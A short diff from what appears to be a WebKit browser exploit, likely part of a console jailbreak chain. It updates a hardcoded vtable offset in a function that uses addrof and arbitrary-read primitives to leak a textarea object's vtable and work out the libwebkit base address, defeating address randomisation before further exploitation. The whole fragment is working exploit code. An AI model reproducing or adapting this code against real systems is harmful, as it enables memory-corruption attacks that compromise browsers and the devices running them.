@@ -136,7 +136,7 @@ function get_bases() {
   const textarea = document.createElement("textarea");
   const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
   const textarea_vtable = webcore_textarea.readp(0);
-  const off_ta_vt = 0x23ba060;
+  const off_ta_vt = 0x23ba070;
   const libwebkit_base = textarea_vtable.sub(off_ta_vt);
 
   const stack_chk_fail_import = libwebkit_base.add(offset_wk_stack_chk_fail);
